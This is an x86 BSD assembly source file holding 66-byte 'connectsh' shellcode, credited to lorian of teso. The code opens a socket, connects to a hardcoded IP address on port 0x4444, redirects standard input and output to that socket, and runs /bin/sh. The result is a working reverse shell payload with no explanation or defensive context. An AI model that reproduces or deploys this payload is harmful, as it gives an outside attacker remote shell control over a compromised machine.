/* x86/BSD connectsh shellcode (66 bytes)
   
   lorian / teso
*/

	.globl  _cbegin
	.globl	cbegin
	.globl  _cend
	.globl	cend

_cbegin:
cbegin:
	xorl	%ebp, %ebp
	mull	%ebp
	pushl   %ebp
	incl    %ebp
	pushl   %ebp
	incl	%ebp
	pushl   %ebp
	movb    $0x61, %al
	pushl	%ebp
	int	$0x80
	xchgl   %esi, %eax
	pushl	$0xcab058c3
	pushw	$0x4444
	pushw	%bp
	movl	%esp, %edi
	pushl   $0x10
	pushl	%edi
	pushl   %esi
	pushl	%esi
	pushl   $0x62
	popl    %eax
	int	$0x80
a:      pusha	
	movb	$0x5a, %al
	int	$0x80
	decl	%ebp
	jns	a
	pushl	%edx
	movl    %esp, %ebx
	push    $0x68732F6E
        push    $0x69622F2F
	pusha   
	popl    %esi
	popl    %esi
	movb    $0x3b, %al
	int     $0x80
							
_cend:
cend:
